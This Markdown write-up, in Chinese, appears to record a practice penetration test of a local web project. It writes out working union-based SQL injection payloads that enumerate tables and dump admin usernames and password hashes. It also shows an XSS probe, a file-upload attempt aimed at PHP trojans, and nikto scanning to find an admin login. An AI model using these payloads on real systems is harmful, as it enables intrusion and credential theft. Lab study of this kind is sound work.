# sql注入
- 当输入一个`'`后页面无回显，说明执行了sql查询语句

  ![](./img/test.png)
- 发现通过构造`url`可以实现数据库的查询，接下来判断它的字段数
  ```sql
  1' and 1=1 order by 2 --+
  1' and 1=1 order by 3 --+
  1' and 1=1 order by 4 --+
  1' and 1=1 order by 5 --+
  ```
- 当输入到了`5`以后，页面没有正常显示查询结果，所以有`4`个字段
  
  ![](./img/order5.png)
- 接下来直接查看回显点
  ```sql
  1' union select 1,2,3,4 --+
  ```
  ![](./img/union.png)
- 查看所有表名，可以看到有三个表名分别为`admin,comment,users`
  ```sql
  1' and 1=2 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database() --+
  ```
  ![](./img/name.png)
- 接下来查看`admin`表的所有字段，可以看到有三个字段分别为 `admin_id,admin_name,admin_pass`
  ```sql
  1' and 1=2 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name='admin' --+
  ```
  ![](./img/adminname.png)
- 然后查看字段内容，`admin_pass`应该为管理员密码
  ```sql
  1' union select 1,group_concat(admin_id,0x3a,admin_name,0x3a,admin_pass),3,4 from project.admin--+
  ```
  ![](./img/pass.png)
- 看到这串字符怀疑是`md5`加密，解密得到密码
  
  ![](./img/md5.png)
- `admin/adminpwd`尝试登录管理员用户，但是失败了
  >此时路径为`project/user/login.php`

  ![](./img/adfail.png)
- 使用后台扫描工具进行扫描`nikto -host http://127.0.0.1/project/`
- 发现其他登录路径为`/project/admin/login.php`
  
  ![](./img/admin.png)
- 与原有登录页面相同，尝试`admin/adminpwd`登录管理员用户

# XSS漏洞
- 看到搜索框。联想到js代码注入
- 测试语句为`<script>alert(123)</script>`
- 没有弹窗，说明没有xss漏洞
  
  ![](./img/xss.png)
# 文件上传漏洞
- 登录之前注册的一个测试账号，点击编辑发现可以上传图像
- 查看源代码，可以看到图片的存储路径
  
  ![](./img/edit.png)
- 将存储路径的`url`直接输入，可以看到原图片
  
  ![](./img/default.png)
- 如果上传`php`文件（木马等），可以直接访问
  
  ![](./img/php.png)
- 尝试上传`php`等类型文件，失败，提示上传`jpg`格式文件
  
  ![](./img/jpg.png)

# 权限跨越漏洞
- 尝试登录`admin`权限，登陆页面试了万能密码和`admin/admin`都登陆失败(此时路径为`/project/user/login.php`)
- 使用后台扫描工具进行扫描`nikto -host http://127.0.0.1/project/`
- 发现其他登录路径为`/project/admin/login.php`
  
  ![](./img/admin.png)
- 与原有登录页面相同，但尝试了`admin`和万能密码还是无法登录
  
  ![](./img/adlogin.png)
